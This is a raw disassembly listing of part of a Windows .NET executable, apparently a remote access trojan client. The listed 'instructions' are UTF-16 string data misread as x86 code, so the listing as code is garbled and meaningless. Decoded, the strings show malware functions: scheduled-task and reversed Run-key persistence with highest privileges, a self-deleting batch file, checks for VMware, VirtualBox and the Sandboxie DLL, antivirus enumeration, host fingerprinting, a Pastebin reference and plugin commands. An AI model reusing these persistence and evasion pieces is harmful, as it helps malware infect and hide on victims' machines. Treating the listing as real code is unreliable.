  40b6d3:	38 00                	cmp    %al,(%eax)
  40b6d5:	51                   	push   %ecx
  40b6d6:	00 50 00             	add    %dl,0x0(%eax)
  40b6d9:	48                   	dec    %eax
  40b6da:	00 39                	add    %bh,(%ecx)
  40b6dc:	00 41 00             	add    %al,0x0(%ecx)
  40b6df:	45                   	inc    %ebp
  40b6e0:	00 51 00             	add    %dl,0x0(%ecx)
  40b6e3:	46                   	inc    %esi
  40b6e4:	00 2f                	add    %ch,(%edi)
  40b6e6:	00 32                	add    %dh,(%edx)
  40b6e8:	00 6a 00             	add    %ch,0x0(%edx)
  40b6eb:	33 00                	xor    (%eax),%eax
  40b6ed:	36 00 45 00          	add    %al,%ss:0x0(%ebp)
  40b6f1:	4f                   	dec    %edi
  40b6f2:	00 44 00 39          	add    %al,0x39(%eax,%eax,1)
  40b6f6:	00 70 00             	add    %dh,0x0(%eax)
  40b6f9:	47                   	inc    %edi
  40b6fa:	00 4b 00             	add    %cl,0x0(%ebx)
  40b6fd:	73 00                	jae    0x40b6ff
  40b6ff:	47                   	inc    %edi
  40b700:	00 45 00             	add    %al,0x0(%ebp)
  40b703:	4a                   	dec    %edx
  40b704:	00 33                	add    %dh,(%ebx)
  40b706:	00 4e 00             	add    %cl,0x0(%esi)
  40b709:	4f                   	dec    %edi
  40b70a:	00 6a 00             	add    %ch,0x0(%edx)
  40b70d:	34 00                	xor    $0x0,%al
  40b70f:	48                   	dec    %eax
  40b710:	00 4e 00             	add    %cl,0x0(%esi)
  40b713:	58                   	pop    %eax
  40b714:	00 51 00             	add    %dl,0x0(%ecx)
  40b717:	75 00                	jne    0x40b719
  40b719:	2f                   	das
  40b71a:	00 73 00             	add    %dh,0x0(%ebx)
  40b71d:	38 00                	cmp    %al,(%eax)
  40b71f:	70 00                	jo     0x40b721
  40b721:	47                   	inc    %edi
  40b722:	00 6d 00             	add    %ch,0x0(%ebp)
  40b725:	2f                   	das
  40b726:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  40b72a:	00 4d 00             	add    %cl,0x0(%ebp)
  40b72d:	33 00                	xor    (%eax),%eax
  40b72f:	75 00                	jne    0x40b731
  40b731:	4c                   	dec    %esp
  40b732:	00 72 00             	add    %dh,0x0(%edx)
  40b735:	77 00                	ja     0x40b737
  40b737:	75 00                	jne    0x40b739
  40b739:	38 00                	cmp    %al,(%eax)
  40b73b:	34 00                	xor    $0x0,%al
  40b73d:	53                   	push   %ebx
  40b73e:	00 51 00             	add    %dl,0x0(%ecx)
  40b741:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b746:	09 6e 00             	or     %ebp,0x0(%esi)
  40b749:	75 00                	jne    0x40b74b
  40b74b:	6c                   	insb   (%dx),%es:(%edi)
  40b74c:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b750:	01 00                	add    %eax,(%eax)
  40b752:	03 3a                	add    (%edx),%edi
  40b754:	00 00                	add    %al,(%eax)
  40b756:	0d 50 00 61 00       	or     $0x610050,%eax
  40b75b:	63 00                	arpl   %eax,(%eax)
  40b75d:	6b 00 65             	imul   $0x65,(%eax),%eax
  40b760:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40b764:	09 50 00             	or     %edx,0x0(%eax)
  40b767:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40b76d:	00 0f                	add    %cl,(%edi)
  40b76f:	4d                   	dec    %ebp
  40b770:	00 65 00             	add    %ah,0x0(%ebp)
  40b773:	73 00                	jae    0x40b775
  40b775:	73 00                	jae    0x40b777
  40b777:	61                   	popa
  40b778:	00 67 00             	add    %ah,0x0(%edi)
  40b77b:	65 00 00             	add    %al,%gs:(%eax)
  40b77e:	07                   	pop    %es
  40b77f:	63 00                	arpl   %eax,(%eax)
  40b781:	6d                   	insl   (%dx),%es:(%edi)
  40b782:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40b786:	69 2f 00 63 00 20    	imul   $0x20006300,(%edi),%ebp
  40b78c:	00 73 00             	add    %dh,0x0(%ebx)
  40b78f:	63 00                	arpl   %eax,(%eax)
  40b791:	68 00 74 00 61       	push   $0x61007400
  40b796:	00 73 00             	add    %dh,0x0(%ebx)
  40b799:	6b 00 73             	imul   $0x73,(%eax),%eax
  40b79c:	00 20                	add    %ah,(%eax)
  40b79e:	00 2f                	add    %ch,(%edi)
  40b7a0:	00 63 00             	add    %ah,0x0(%ebx)
  40b7a3:	72 00                	jb     0x40b7a5
  40b7a5:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40b7a9:	74 00                	je     0x40b7ab
  40b7ab:	65 00 20             	add    %ah,%gs:(%eax)
  40b7ae:	00 2f                	add    %ch,(%edi)
  40b7b0:	00 66 00             	add    %ah,0x0(%esi)
  40b7b3:	20 00                	and    %al,(%eax)
  40b7b5:	2f                   	das
  40b7b6:	00 73 00             	add    %dh,0x0(%ebx)
  40b7b9:	63 00                	arpl   %eax,(%eax)
  40b7bb:	20 00                	and    %al,(%eax)
  40b7bd:	6f                   	outsl  %ds:(%esi),(%dx)
  40b7be:	00 6e 00             	add    %ch,0x0(%esi)
  40b7c1:	6c                   	insb   (%dx),%es:(%edi)
  40b7c2:	00 6f 00             	add    %ch,0x0(%edi)
  40b7c5:	67 00 6f 00          	add    %ch,0x0(%bx)
  40b7c9:	6e                   	outsb  %ds:(%esi),(%dx)
  40b7ca:	00 20                	add    %ah,(%eax)
  40b7cc:	00 2f                	add    %ch,(%edi)
  40b7ce:	00 72 00             	add    %dh,0x0(%edx)
  40b7d1:	6c                   	insb   (%dx),%es:(%edi)
  40b7d2:	00 20                	add    %ah,(%eax)
  40b7d4:	00 68 00             	add    %ch,0x0(%eax)
  40b7d7:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  40b7dd:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40b7e1:	74 00                	je     0x40b7e3
  40b7e3:	20 00                	and    %al,(%eax)
  40b7e5:	2f                   	das
  40b7e6:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40b7ea:	00 20                	add    %ah,(%eax)
  40b7ec:	00 22                	add    %ah,(%edx)
  40b7ee:	00 00                	add    %al,(%eax)
  40b7f0:	11 22                	adc    %esp,(%edx)
  40b7f2:	00 20                	add    %ah,(%eax)
  40b7f4:	00 2f                	add    %ch,(%edi)
  40b7f6:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40b7fa:	00 20                	add    %ah,(%eax)
  40b7fc:	00 27                	add    %ah,(%edi)
  40b7fe:	00 22                	add    %ah,(%edx)
  40b800:	00 01                	add    %al,(%ecx)
  40b802:	13 22                	adc    (%edx),%esp
  40b804:	00 27                	add    %ah,(%edi)
  40b806:	00 20                	add    %ah,(%eax)
  40b808:	00 26                	add    %ah,(%esi)
  40b80a:	00 20                	add    %ah,(%eax)
  40b80c:	00 65 00             	add    %ah,0x0(%ebp)
  40b80f:	78 00                	js     0x40b811
  40b811:	69 00 74 00 01 5d    	imul   $0x5d010074,(%eax),%eax
  40b817:	5c                   	pop    %esp
  40b818:	00 6e 00             	add    %ch,0x0(%esi)
  40b81b:	75 00                	jne    0x40b81d
  40b81d:	52                   	push   %edx
  40b81e:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  40b822:	00 6f 00             	add    %ch,0x0(%edi)
  40b825:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  40b82b:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40b82f:	74 00                	je     0x40b831
  40b831:	6e                   	outsb  %ds:(%esi),(%dx)
  40b832:	00 65 00             	add    %ah,0x0(%ebp)
  40b835:	72 00                	jb     0x40b837
  40b837:	72 00                	jb     0x40b839
  40b839:	75 00                	jne    0x40b83b
  40b83b:	43                   	inc    %ebx
  40b83c:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  40b840:	00 77 00             	add    %dh,0x0(%edi)
  40b843:	6f                   	outsl  %ds:(%esi),(%dx)
  40b844:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40b848:	00 69 00             	add    %ch,0x0(%ecx)
  40b84b:	57                   	push   %edi
  40b84c:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  40b850:	00 66 00             	add    %ah,0x0(%esi)
  40b853:	6f                   	outsl  %ds:(%esi),(%dx)
  40b854:	00 73 00             	add    %dh,0x0(%ebx)
  40b857:	6f                   	outsl  %ds:(%esi),(%dx)
  40b858:	00 72 00             	add    %dh,0x0(%edx)
  40b85b:	63 00                	arpl   %eax,(%eax)
  40b85d:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  40b863:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b867:	61                   	popa
  40b868:	00 77 00             	add    %dh,0x0(%edi)
  40b86b:	74 00                	je     0x40b86d
  40b86d:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40b871:	53                   	push   %ebx
  40b872:	00 00                	add    %al,(%eax)
  40b874:	03 22                	add    (%edx),%esp
  40b876:	00 00                	add    %al,(%eax)
  40b878:	09 2e                	or     %ebp,(%esi)
  40b87a:	00 62 00             	add    %ah,0x0(%edx)
  40b87d:	61                   	popa
  40b87e:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40b882:	13 40 00             	adc    0x0(%eax),%eax
  40b885:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b889:	68 00 6f 00 20       	push   $0x20006f00
  40b88e:	00 6f 00             	add    %ch,0x0(%edi)
  40b891:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40b895:	00 1f                	add    %bl,(%edi)
  40b897:	74 00                	je     0x40b899
  40b899:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40b89f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8a0:	00 75 00             	add    %dh,0x0(%ebp)
  40b8a3:	74 00                	je     0x40b8a5
  40b8a5:	20 00                	and    %al,(%eax)
  40b8a7:	33 00                	xor    (%eax),%eax
  40b8a9:	20 00                	and    %al,(%eax)
  40b8ab:	3e 00 20             	add    %ah,%ds:(%eax)
  40b8ae:	00 4e 00             	add    %cl,0x0(%esi)
  40b8b1:	55                   	push   %ebp
  40b8b2:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40b8b6:	15 53 00 54 00       	adc    $0x540053,%eax
  40b8bb:	41                   	inc    %ecx
  40b8bc:	00 52 00             	add    %dl,0x0(%edx)
  40b8bf:	54                   	push   %esp
  40b8c0:	00 20                	add    %ah,(%eax)
  40b8c2:	00 22                	add    %ah,(%edx)
  40b8c4:	00 22                	add    %ah,(%edx)
  40b8c6:	00 20                	add    %ah,(%eax)
  40b8c8:	00 22                	add    %ah,(%edx)
  40b8ca:	00 00                	add    %al,(%eax)
  40b8cc:	07                   	pop    %es
  40b8cd:	43                   	inc    %ebx
  40b8ce:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40b8d2:	00 00                	add    %al,(%eax)
  40b8d4:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  40b8d8:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40b8dc:	00 22                	add    %ah,(%edx)
  40b8de:	00 00                	add    %al,(%eax)
  40b8e0:	0f 22 00             	mov    %eax,%cr0
  40b8e3:	20 00                	and    %al,(%eax)
  40b8e5:	2f                   	das
  40b8e6:	00 66 00             	add    %ah,0x0(%esi)
  40b8e9:	20 00                	and    %al,(%eax)
  40b8eb:	2f                   	das
  40b8ec:	00 71 00             	add    %dh,0x0(%ecx)
  40b8ef:	00 05 78 00 70 00    	add    %al,0x700078
  40b8f5:	00 45 53             	add    %al,0x53(%ebp)
  40b8f8:	00 65 00             	add    %ah,0x0(%ebp)
  40b8fb:	6c                   	insb   (%dx),%es:(%edi)
  40b8fc:	00 65 00             	add    %ah,0x0(%ebp)
  40b8ff:	63 00                	arpl   %eax,(%eax)
  40b901:	74 00                	je     0x40b903
  40b903:	20 00                	and    %al,(%eax)
  40b905:	2a 00                	sub    (%eax),%al
  40b907:	20 00                	and    %al,(%eax)
  40b909:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40b90d:	6f                   	outsl  %ds:(%esi),(%dx)
  40b90e:	00 6d 00             	add    %ch,0x0(%ebp)
  40b911:	20 00                	and    %al,(%eax)
  40b913:	57                   	push   %edi
  40b914:	00 69 00             	add    %ch,0x0(%ecx)
  40b917:	6e                   	outsb  %ds:(%esi),(%dx)
  40b918:	00 33                	add    %dh,(%ebx)
  40b91a:	00 32                	add    %dh,(%edx)
  40b91c:	00 5f 00             	add    %bl,0x0(%edi)
  40b91f:	43                   	inc    %ebx
  40b920:	00 6f 00             	add    %ch,0x0(%edi)
  40b923:	6d                   	insl   (%dx),%es:(%edi)
  40b924:	00 70 00             	add    %dh,0x0(%eax)
  40b927:	75 00                	jne    0x40b929
  40b929:	74 00                	je     0x40b92b
  40b92b:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b92f:	53                   	push   %ebx
  40b930:	00 79 00             	add    %bh,0x0(%ecx)
  40b933:	73 00                	jae    0x40b935
  40b935:	74 00                	je     0x40b937
  40b937:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40b93b:	00 19                	add    %bl,(%ecx)
  40b93d:	4d                   	dec    %ebp
  40b93e:	00 61 00             	add    %ah,0x0(%ecx)
  40b941:	6e                   	outsb  %ds:(%esi),(%dx)
  40b942:	00 75 00             	add    %dh,0x0(%ebp)
  40b945:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40b949:	63 00                	arpl   %eax,(%eax)
  40b94b:	74 00                	je     0x40b94d
  40b94d:	75 00                	jne    0x40b94f
  40b94f:	72 00                	jb     0x40b951
  40b951:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b955:	00 2b                	add    %ch,(%ebx)
  40b957:	6d                   	insl   (%dx),%es:(%edi)
  40b958:	00 69 00             	add    %ch,0x0(%ecx)
  40b95b:	63 00                	arpl   %eax,(%eax)
  40b95d:	72 00                	jb     0x40b95f
  40b95f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b960:	00 73 00             	add    %dh,0x0(%ebx)
  40b963:	6f                   	outsl  %ds:(%esi),(%dx)
  40b964:	00 66 00             	add    %ah,0x0(%esi)
  40b967:	74 00                	je     0x40b969
  40b969:	20 00                	and    %al,(%eax)
  40b96b:	63 00                	arpl   %eax,(%eax)
  40b96d:	6f                   	outsl  %ds:(%esi),(%dx)
  40b96e:	00 72 00             	add    %dh,0x0(%edx)
  40b971:	70 00                	jo     0x40b973
  40b973:	6f                   	outsl  %ds:(%esi),(%dx)
  40b974:	00 72 00             	add    %dh,0x0(%edx)
  40b977:	61                   	popa
  40b978:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40b97c:	00 6f 00             	add    %ch,0x0(%edi)
  40b97f:	6e                   	outsb  %ds:(%esi),(%dx)
  40b980:	00 00                	add    %al,(%eax)
  40b982:	0b 4d 00             	or     0x0(%ebp),%ecx
  40b985:	6f                   	outsl  %ds:(%esi),(%dx)
  40b986:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40b98a:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b98e:	0f 56 00             	orps   (%eax),%xmm0
  40b991:	49                   	dec    %ecx
  40b992:	00 52 00             	add    %dl,0x0(%edx)
  40b995:	54                   	push   %esp
  40b996:	00 55 00             	add    %dl,0x0(%ebp)
  40b999:	41                   	inc    %ecx
  40b99a:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40b99e:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40b9a3:	77 00                	ja     0x40b9a5
  40b9a5:	61                   	popa
  40b9a6:	00 72 00             	add    %dh,0x0(%edx)
  40b9a9:	65 00 00             	add    %al,%gs:(%eax)
  40b9ac:	15 56 00 69 00       	adc    $0x690056,%eax
  40b9b1:	72 00                	jb     0x40b9b3
  40b9b3:	74 00                	je     0x40b9b5
  40b9b5:	75 00                	jne    0x40b9b7
  40b9b7:	61                   	popa
  40b9b8:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40b9bc:	00 6f 00             	add    %ch,0x0(%edi)
  40b9bf:	78 00                	js     0x40b9c1
  40b9c1:	00 17                	add    %dl,(%edi)
  40b9c3:	53                   	push   %ebx
  40b9c4:	00 62 00             	add    %ah,0x0(%edx)
  40b9c7:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40b9cd:	6c                   	insb   (%dx),%es:(%edi)
  40b9ce:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40b9d2:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40b9d6:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b9da:	11 45 00             	adc    %eax,0x0(%ebp)
  40b9dd:	72 00                	jb     0x40b9df
  40b9df:	72 00                	jb     0x40b9e1
  40b9e1:	20 00                	and    %al,(%eax)
  40b9e3:	48                   	dec    %eax
  40b9e4:	00 57 00             	add    %dl,0x0(%edi)
  40b9e7:	49                   	dec    %ecx
  40b9e8:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40b9ec:	05 78 00 32 00       	add    $0x320078,%eax
  40b9f1:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  40b9f7:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  40b9fd:	74 00                	je     0x40b9ff
  40b9ff:	49                   	dec    %ecx
  40ba00:	00 6e 00             	add    %ch,0x0(%esi)
  40ba03:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40ba07:	00 09                	add    %cl,(%ecx)
  40ba09:	48                   	dec    %eax
  40ba0a:	00 57 00             	add    %dl,0x0(%edi)
  40ba0d:	49                   	dec    %ecx
  40ba0e:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40ba12:	09 55 00             	or     %edx,0x0(%ebp)
  40ba15:	73 00                	jae    0x40ba17
  40ba17:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40ba1b:	00 05 4f 00 53 00    	add    %al,0x53004f
  40ba21:	00 13                	add    %dl,(%ebx)
  40ba23:	4d                   	dec    %ebp
  40ba24:	00 69 00             	add    %ch,0x0(%ecx)
  40ba27:	63 00                	arpl   %eax,(%eax)
  40ba29:	72 00                	jb     0x40ba2b
  40ba2b:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba2c:	00 73 00             	add    %dh,0x0(%ebx)
  40ba2f:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba30:	00 66 00             	add    %ah,0x0(%esi)
  40ba33:	74 00                	je     0x40ba35
  40ba35:	00 03                	add    %al,(%ebx)
  40ba37:	20 00                	and    %al,(%eax)
  40ba39:	00 09                	add    %cl,(%ecx)
  40ba3b:	54                   	push   %esp
  40ba3c:	00 72 00             	add    %dh,0x0(%edx)
  40ba3f:	75 00                	jne    0x40ba41
  40ba41:	65 00 00             	add    %al,%gs:(%eax)
  40ba44:	0b 36                	or     (%esi),%esi
  40ba46:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ba49:	62 00                	bound  %eax,(%eax)
  40ba4b:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  40ba51:	46                   	inc    %esi
  40ba52:	00 61 00             	add    %ah,0x0(%ecx)
  40ba55:	6c                   	insb   (%dx),%es:(%edi)
  40ba56:	00 73 00             	add    %dh,0x0(%ebx)
  40ba59:	65 00 00             	add    %al,%gs:(%eax)
  40ba5c:	0b 33                	or     (%ebx),%esi
  40ba5e:	00 32                	add    %dh,(%edx)
  40ba60:	00 62 00             	add    %ah,0x0(%edx)
  40ba63:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40ba69:	50                   	push   %eax
  40ba6a:	00 61 00             	add    %ah,0x0(%ecx)
  40ba6d:	74 00                	je     0x40ba6f
  40ba6f:	68 00 00 0f 56       	push   $0x560f0000
  40ba74:	00 65 00             	add    %ah,0x0(%ebp)
  40ba77:	72 00                	jb     0x40ba79
  40ba79:	73 00                	jae    0x40ba7b
  40ba7b:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40ba81:	00 0b                	add    %cl,(%ebx)
  40ba83:	41                   	inc    %ecx
  40ba84:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40ba88:	00 69 00             	add    %ch,0x0(%ecx)
  40ba8b:	6e                   	outsb  %ds:(%esi),(%dx)
  40ba8c:	00 00                	add    %al,(%eax)
  40ba8e:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  40ba92:	00 75 00             	add    %dh,0x0(%ebp)
  40ba95:	65 00 00             	add    %al,%gs:(%eax)
  40ba98:	0b 66 00             	or     0x0(%esi),%esp
  40ba9b:	61                   	popa
  40ba9c:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40baa0:	00 65 00             	add    %ah,0x0(%ebp)
  40baa3:	00 17                	add    %dl,(%edi)
  40baa5:	50                   	push   %eax
  40baa6:	00 65 00             	add    %ah,0x0(%ebp)
  40baa9:	72 00                	jb     0x40baab
  40baab:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40baaf:	72 00                	jb     0x40bab1
  40bab1:	6d                   	insl   (%dx),%es:(%edi)
  40bab2:	00 61 00             	add    %ah,0x0(%ecx)
  40bab5:	6e                   	outsb  %ds:(%esi),(%dx)
  40bab6:	00 63 00             	add    %ah,0x0(%ebx)
  40bab9:	65 00 00             	add    %al,%gs:(%eax)
  40babc:	11 50 00             	adc    %edx,0x0(%eax)
  40babf:	61                   	popa
  40bac0:	00 73 00             	add    %dh,0x0(%ebx)
  40bac3:	74 00                	je     0x40bac5
  40bac5:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40bac9:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  40bacf:	41                   	inc    %ecx
  40bad0:	00 6e 00             	add    %ch,0x0(%esi)
  40bad3:	74 00                	je     0x40bad5
  40bad5:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40badb:	72 00                	jb     0x40badd
  40badd:	75 00                	jne    0x40badf
  40badf:	73 00                	jae    0x40bae1
  40bae1:	00 13                	add    %dl,(%ebx)
  40bae3:	49                   	dec    %ecx
  40bae4:	00 6e 00             	add    %ch,0x0(%esi)
  40bae7:	73 00                	jae    0x40bae9
  40bae9:	74 00                	je     0x40baeb
  40baeb:	61                   	popa
  40baec:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40baf0:	00 65 00             	add    %ah,0x0(%ebp)
  40baf3:	64 00 00             	add    %al,%fs:(%eax)
  40baf6:	09 50 00             	or     %edx,0x0(%eax)
  40baf9:	6f                   	outsl  %ds:(%esi),(%dx)
  40bafa:	00 6e 00             	add    %ch,0x0(%esi)
  40bafd:	67 00 00             	add    %al,(%bx,%si)
  40bb00:	0b 47 00             	or     0x0(%edi),%eax
  40bb03:	72 00                	jb     0x40bb05
  40bb05:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb06:	00 75 00             	add    %dh,0x0(%ebp)
  40bb09:	70 00                	jo     0x40bb0b
  40bb0b:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  40bb11:	00 2b                	add    %ch,(%ebx)
  40bb13:	5c                   	pop    %esp
  40bb14:	00 72 00             	add    %dh,0x0(%edx)
  40bb17:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb18:	00 6f 00             	add    %ch,0x0(%edi)
  40bb1b:	74 00                	je     0x40bb1d
  40bb1d:	5c                   	pop    %esp
  40bb1e:	00 53 00             	add    %dl,0x0(%ebx)
  40bb21:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bb25:	75 00                	jne    0x40bb27
  40bb27:	72 00                	jb     0x40bb29
  40bb29:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40bb2f:	43                   	inc    %ebx
  40bb30:	00 65 00             	add    %ah,0x0(%ebp)
  40bb33:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb34:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40bb38:	00 72 00             	add    %dh,0x0(%edx)
  40bb3b:	32 00                	xor    (%eax),%al
  40bb3d:	00 3d 53 00 65 00    	add    %bh,0x650053
  40bb43:	6c                   	insb   (%dx),%es:(%edi)
  40bb44:	00 65 00             	add    %ah,0x0(%ebp)
  40bb47:	63 00                	arpl   %eax,(%eax)
  40bb49:	74 00                	je     0x40bb4b
  40bb4b:	20 00                	and    %al,(%eax)
  40bb4d:	2a 00                	sub    (%eax),%al
  40bb4f:	20 00                	and    %al,(%eax)
  40bb51:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40bb55:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb56:	00 6d 00             	add    %ch,0x0(%ebp)
  40bb59:	20 00                	and    %al,(%eax)
  40bb5b:	41                   	inc    %ecx
  40bb5c:	00 6e 00             	add    %ch,0x0(%esi)
  40bb5f:	74 00                	je     0x40bb61
  40bb61:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40bb67:	72 00                	jb     0x40bb69
  40bb69:	75 00                	jne    0x40bb6b
  40bb6b:	73 00                	jae    0x40bb6d
  40bb6d:	50                   	push   %eax
  40bb6e:	00 72 00             	add    %dh,0x0(%edx)
  40bb71:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb72:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40bb76:	00 63 00             	add    %ah,0x0(%ebx)
  40bb79:	74 00                	je     0x40bb7b
  40bb7b:	00 17                	add    %dl,(%edi)
  40bb7d:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40bb81:	73 00                	jae    0x40bb83
  40bb83:	70 00                	jo     0x40bb85
  40bb85:	6c                   	insb   (%dx),%es:(%edi)
  40bb86:	00 61 00             	add    %ah,0x0(%ecx)
  40bb89:	79 00                	jns    0x40bb8b
  40bb8b:	4e                   	dec    %esi
  40bb8c:	00 61 00             	add    %ah,0x0(%ecx)
  40bb8f:	6d                   	insl   (%dx),%es:(%edi)
  40bb90:	00 65 00             	add    %ah,0x0(%ebp)
  40bb93:	00 07                	add    %al,(%edi)
  40bb95:	4e                   	dec    %esi
  40bb96:	00 2f                	add    %ch,(%edi)
  40bb98:	00 41 00             	add    %al,0x0(%ecx)
  40bb9b:	00 05 2c 00 20 00    	add    %al,0x20002c
  40bba1:	00 13                	add    %dl,(%ebx)
  40bba3:	53                   	push   %ebx
  40bba4:	00 6f 00             	add    %ch,0x0(%edi)
  40bba7:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40bbac:	00 61 00             	add    %ah,0x0(%ecx)
  40bbaf:	72 00                	jb     0x40bbb1
  40bbb1:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40bbb6:	09 70 00             	or     %esi,0x0(%eax)
  40bbb9:	6f                   	outsl  %ds:(%esi),(%dx)
  40bbba:	00 6e 00             	add    %ch,0x0(%esi)
  40bbbd:	67 00 00             	add    %al,(%bx,%si)
  40bbc0:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  40bbc5:	75 00                	jne    0x40bbc7
  40bbc7:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40bbcb:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbcc:	00 00                	add    %al,(%eax)
  40bbce:	15 73 00 61 00       	adc    $0x610073,%eax
  40bbd3:	76 00                	jbe    0x40bbd5
  40bbd5:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40bbd9:	6c                   	insb   (%dx),%es:(%edi)
  40bbda:	00 75 00             	add    %dh,0x0(%ebp)
  40bbdd:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40bbe1:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbe2:	00 00                	add    %al,(%eax)
  40bbe4:	07                   	pop    %es
  40bbe5:	44                   	inc    %esp
  40bbe6:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40bbea:	00 00                	add    %al,(%eax)
  40bbec:	15 73 00 65 00       	adc    $0x650073,%eax
  40bbf1:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbf2:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40bbf6:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bbfa:	00 67 00             	add    %ah,0x0(%edi)
  40bbfd:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  40bc03:	48                   	dec    %eax
  40bc04:	00 61 00             	add    %ah,0x0(%ecx)
  40bc07:	73 00                	jae    0x40bc09
  40bc09:	68 00 65 00 73       	push   $0x73006500
  40bc0e:	00 00                	add    %al,(%eax)
  40bc10:	09 48 00             	or     %ecx,0x0(%eax)
  40bc13:	61                   	popa
  40bc14:	00 73 00             	add    %dh,0x0(%ebx)
  40bc17:	68 00 00 1b 50       	push   $0x501b0000
  40bc1c:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bc20:	00 67 00             	add    %ah,0x0(%edi)
  40bc23:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40bc29:	50                   	push   %eax
  40bc2a:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bc2e:	00 67 00             	add    %ah,0x0(%edi)
  40bc31:	69 00 6e 00 00 07    	imul   $0x700006e,(%eax),%eax
  40bc37:	52                   	push   %edx
  40bc38:	00 75 00             	add    %dh,0x0(%ebp)
  40bc3b:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc3c:	00 00                	add    %al,(%eax)
  40bc3e:	0f 4d 00             	cmovge (%eax),%eax
  40bc41:	73 00                	jae    0x40bc43
